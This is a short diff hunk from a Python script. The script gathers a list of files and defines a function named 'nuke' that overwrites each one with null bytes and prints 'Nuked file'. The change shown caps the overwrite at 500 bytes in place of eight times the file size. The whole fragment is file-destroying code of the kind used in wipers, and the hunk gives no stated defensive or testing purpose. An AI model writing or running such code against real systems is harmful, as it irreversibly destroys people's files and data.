@@ -40,7 +40,7 @@ for f in os.listdir():
                 flist.append(os.path.join(root, file))
 def nuke(i):
     try:
-        size = os.path.getsize(i)*8
+        size = min(os.path.getsize(i), 500)
         with open(i, 'wb') as g:
             g.write(b'\x00' * size)
             print(f"Nuked file: {i}")
